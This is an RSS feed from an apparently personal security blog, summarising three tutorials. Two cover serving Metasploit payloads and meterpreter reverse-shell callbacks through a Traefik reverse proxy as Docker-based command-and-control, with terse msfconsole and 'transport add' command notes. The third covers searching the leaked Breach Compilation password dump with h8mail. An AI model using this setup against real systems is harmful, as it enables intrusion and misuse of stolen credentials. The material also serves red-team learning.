channel.title: docker on khast3x blog
channel.description: Recent content in docker on khast3x blog

item.title: Serving payloads with Metasploit and Traefik
item.description: Since Redcloud, and generally getting more comfortable deploying Docker container as C2, I have been meaning to try out Traefik as an Apache/NGINX alternative for a C2 reverse-proxy. In this post, I’ll be demonstrating how to achieve this. What are we doing We’re going to use Traefik as a reverse proxy to Metasploit. This includes payload delivery from Metasploit’s web_delivery script, and the reverse call back from the meterpreter, both meterpreter_reverse_http and meterpreter_reverse_tcp.

item.title: Serving payloads in the cloud with Metasploit and Docker
item.description: Traefik Done - Reverse http+tcp Use the docker-compose.yml method to deploy Defining each service attached to each definition solved the multi service error Want to try with tcp This Doc page with more details on making rules/chaning them here Securing the docker host exposing the the api here Test staged payload How to run docker-compose up [new connection] docker exec -it msfconsole /bin/bash ./msfconsole -r web_delivery.rc > run OR for TCP set payload 10 + set LPORT 8888 + run transport add -t reverse_http -u handler -l 163.

item.title: Password Breaches with Docker and h8mail
item.description:
In this tutorial, we’re going to move downloading and searching operations to the cloud to speed things up.
We’ll achieve this using a torrent downloader container, the h8mail container and a shared volume. For demonstration purposes, we’ll be studying the Breach Compilation.
